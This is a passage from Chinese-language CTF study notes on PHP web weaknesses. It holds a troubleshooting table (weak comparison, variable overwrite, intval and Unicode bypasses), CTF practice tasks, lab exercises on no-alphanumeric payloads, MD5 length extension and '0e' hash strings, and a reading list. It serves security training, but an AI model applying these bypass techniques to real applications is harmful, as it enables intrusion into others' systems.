| NFD 编码的文件名打不中 NFC 存储的文件 | 文件系统按字节匹配：请求侧先做 `normalizer_normalize` 归一（[[#4. Unicode 规范化与大小写折叠\|第 4 节]]） |
| `mb_strtolower` 折不出 `ſ`→`s` | 小写映射与完整折叠是两张表：PHP 内置只有前者，`ſ` 用 K（U+212A）替代，或换支持完整折叠的引擎（[[#4. Unicode 规范化与大小写折叠\|第 4 节]]） |
| JSON 传 true 绕不过鉴权 | 服务端用了 `=== true` 或类型声明：弱比较通路只在 `==` 存在时有效（[[#1.5 json_decode 之后的 true/1 混淆\|1.5]]） |
| `extract` 补丁后仍被覆盖 | `EXTR_OVERWRITE` 之外的导入点（`$$` 循环、`parse_str` 未带第二参）同样注册变量：全库检索这三种形态（[[#6. 其他 Tricky 速览\|第 6 节]]） |
| `intval` 防了负数小数仍被打 | 截断只治小数：整数负值、科学计数法（`1e3`=1000）、浮点精度误差各是一条独立的路（[[#6. 其他 Tricky 速览\|第 6 节]]） |

## 9. 配套练习与延伸阅读

> [!note] 实战任务
> 1. **CTFshow Web 入门**（[[01-练习平台索引|01 章]]收录入口）：弱类型与命令执行分区里，每题先按本章第 1 节的规则表预判"哪个比较会被绕"，再上靶核对；无字母数字分区按"取反 → 异或 → 自增链"的顺序找可用构造器，过滤条件每题不同。
> 2. **BUUCTF Web 区**（[[01-练习平台索引|01 章]]收录入口）：检索 md5 弱类型题（题面出现 `md5($_GET[a]) == md5($_GET[b])` 形态），区分哪些能用 0e 对、哪些必须数组、哪些要求真碰撞——三种子型分别对应本章 1.2、1.3、2 节。

配套练习：

1. 给靶 A 的过滤改成 `/[\w\x80-\xff]/`（连高字节一起禁），重打 5.1 的取反 payload；分析还剩哪些可用字符，说明为什么这一形态下 PHP 8 靶基本无解，而自增链也因变量名需要字母/下划线而失效——==过滤覆盖面决定构造器的生死==。
2. 把 `sha1ext.py` 的压缩函数换成 MD5（同为 Merkle–Damgård，32 位字小端、四轮 64 步），对 `md5(secret||data)` 的签名靶做长度扩展；`hashlib.md5` 做自检基准。
3. 写一个 0e 搜集脚本：限定"前缀自由 + md5 为 `0e` 开头 + 余下 30 位全数字"，在随机串空间里搜出一对新成员；对比表内已知串，体会这类表为什么可以预先算好。
4. 给 `collide.php` 加第二道门 `sha1($c1) === sha1($c2)`，重新打碰撞对，观察失败；再按"换算法即防御"的思路评估：md5 换 sha1 后，攻击者需要什么成本。
5. 把靶 B 的取参改到 POST（payload 里拼出 `"_POST"` 而不是 `"_GET"`）：查 ASCII 表重新选异或对，生成并打靶一次。

延伸阅读：

- PHP 手册的 Comparison Operators 一页：类型转换总表（PHP 8 版）与逐版本变更记录，1.1 规则的权威出处；
- PHP 手册的 `hash_equals`、Normalizer、`mb_strtolower` 三页：恒时比较、归一化 API 与小写映射的边界说明；
- Marc Stevens 的 hashclash 项目与 fastcoll 工具：选择前缀碰撞的生成器，第 2 节折叠框里两次真实世界攻击的工具来源；
- RFC 2104（HMAC）：为什么"包一层哈希"在结构上免疫长度扩展，与第 3 节的裸拼法对照读；
- PayloadsAllTheThings 仓库的 PHP 弱类型与"PHP RCE without letters"条目：本章各构造器的社区变体索引（[[03-工具清单|工具清单]]有仓库入口）；
- 相邻章节：[[W13-逻辑与认证漏洞|W13]]的支付靶是 intval 截断的实战场；[[W15-Python反序列化与沙箱逃逸|W15]]是"数据变代码"家族的 Python 侧；JS 侧的 `==` 抽象相等与原型污染属 Node.js 题型，由后续章节展开。
